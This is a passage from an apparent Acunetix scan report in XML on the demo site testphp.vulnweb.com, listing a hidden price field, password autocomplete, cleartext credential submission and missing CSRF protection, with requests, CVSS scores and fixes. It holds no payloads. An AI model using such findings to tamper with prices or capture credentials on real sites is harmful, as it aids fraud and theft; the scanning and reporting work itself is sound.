Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:03 GMT
Content-Type: text/xml
Content-Length: 224
Last-Modified: Tue, 11 Sep 2012 10:30:22 GMT
Connection: keep-alive
ETag: &quot;504f12be-e0&quot;
Accept-Ranges: bytes
]]></Response>
       </TechnicalDetails>
       <CWE id="284"><![CDATA[CWE-284]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]]></Descriptor>
          <Score><![CDATA[6.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[Low]]></C>
          <Cdesc><![CDATA[There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Cross-domain policy file usage recommendations for Flash Player]]></Database>
          <URL><![CDATA[http://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross-domain policy files]]></Database>
          <URL><![CDATA[http://blogs.adobe.com/stateofsecurity/2007/07/crossdomain_policy_files_1.html]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="8" color="blue">
       <Name><![CDATA[Hidden form input named price was found]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">f_addcart</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/cart.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>price [Hidden]</li><li>addcart [Hidden]</li></ul>]]></Details>
       <Affects><![CDATA[/product.php (a770732ffe2df697cc80cbd86328ad78)]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[User may change price information before submitting the form.]]></Impact>
       <Description><![CDATA[A hidden form input named price was found. It's not recommended to hide sensitive information in hidden form fields.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if the script inputs are properly validated.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /product.php?pic=3 HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/search.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:05 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5540
]]></Response>
       </TechnicalDetails>
       <CWE id="16"><![CDATA[CWE-16]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[]]></Descriptor>
          <Score><![CDATA[]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="9" color="green">
       <Name><![CDATA[Password type input with auto-complete enabled]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Password type input named <b><font color="dark">upass</font></b> from form named <b>form1</b> with action <b>/secured/newuser.php</b> has autocomplete enabled.]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved.Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The password auto-complete should be disabled in sensitive applications. <br/>To disable auto-complete, you may use a code similar to: <pre wrap="virtual"><code>&lt;INPUT TYPE=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot;&gt;</code></pre>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="10" color="green">
       <Name><![CDATA[Password type input with auto-complete enabled]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Password type input named <b><font color="dark">upass2</font></b> from form named <b>form1</b> with action <b>/secured/newuser.php</b> has autocomplete enabled.]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[info]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[Possible sensitive information disclosure.]]></Impact>
       <Description><![CDATA[When a new name and password is entered in a form and the form is submitted, the browser asks if the password should be saved.Thereafter when the form is displayed, the name and password are filled in automatically or are completed as the name is entered. An attacker with local access could obtain the cleartext password from the browser cache.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The password auto-complete should be disabled in sensitive applications. <br/>To disable auto-complete, you may use a code similar to: <pre wrap="virtual"><code>&lt;INPUT TYPE=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot;&gt;</code></pre>]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:N/A:N]]></Descriptor>
          <Score><![CDATA[0.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="11" color="orange">
       <Name><![CDATA[User credentials are sent in clear text]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">form1</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/secured/newuser.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uuname [Text]</li><li>upass [Password]</li><li>upass2 [Password]</li><li>urname [Text]</li><li>ucc [Text]</li><li>uemail [Text]</li><li>uphone [Text]</li><li>uaddress [TextArea]</li><li>signup [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[A third party may be able to read the user credentials by intercepting an unencrypted HTTP connection.]]></Impact>
       <Description><![CDATA[User credentials are transmitted over an unencrypted channel. This information should always be transferred via an encrypted channel (HTTPS) to avoid being intercepted by malicious users.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Because user credentials are considered sensitive information, should always be transferred to the server over an encrypted connection (HTTPS).]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="310"><![CDATA[CWE-310]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N/E:H/RL:W/RC:C]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[High]]></E>
          <Edesc><![CDATA[Either the vulnerability is exploitable by functional mobile autonomous code, or no exploit is required (manual trigger) and details are widely available.]]></Edesc>
          <RL><![CDATA[Workaround]]></RL>
          <RLdesc><![CDATA[There is an unofficial, non-vendor solution available. In some cases, users of the affected technology will create a patch of their own or provide steps to work around or otherwise mitigate the vulnerability.]]></RLdesc>
          <RC><![CDATA[Confirmed]]></RC>
          <RCdesc><![CDATA[The vulnerability has been acknowledged by the vendor or author of the affected technology.]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[9.1]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
      <References></References>
      </ReportItem>

      <ReportItem id="12" color="orange">
       <Name><![CDATA[HTML form without CSRF protection]]></Name>
       <ModuleName><![CDATA[Crawler]]></ModuleName>
       <Details><![CDATA[Form name: <font color="navy">form1</font><br/>Form action: <font color="navy">http://testphp.vulnweb.com/secured/newuser.php</font><br/>Form method: <font color="navy">POST</font><br/><br/>Form inputs:<br/><ul><li>uuname [Text]</li><li>upass [Password]</li><li>upass2 [Password]</li><li>urname [Text]</li><li>ucc [Text]</li><li>uemail [Text]</li><li>uphone [Text]</li><li>uaddress [TextArea]</li><li>signup [Submit]</li></ul>]]></Details>
       <Affects><![CDATA[/signup.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Informational]]></Type>
       <Impact><![CDATA[An attacker may force the users of a web application to execute actions of the attacker''s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.]]></Impact>
       <Description><![CDATA[ <div class="coolbox"><font color="dark">This alert may be a false positive, manual confirmation is required.</font></div><br/>
Cross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.

<br/><br/>Acunetix WVS found a HTML form with no apparent CSRF protection implemented. Consult details for more information about the affected HTML form.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Check if this form requires CSRF protection and implement CSRF countermeasures if necessary.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /signup.php HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/login.php
Acunetix-Aspect: enabled
Acunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c
Acunetix-Aspect-Queries: aspectalerts
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Mon, 02 Feb 1970 21:43:09 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 5183
]]></Response>
       </TechnicalDetails>
       <CWE id="352"><![CDATA[CWE-352]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:H/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[2.6]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[High]]></AC>
          <ACdesc><![CDATA[Specialized access conditions exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[4.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
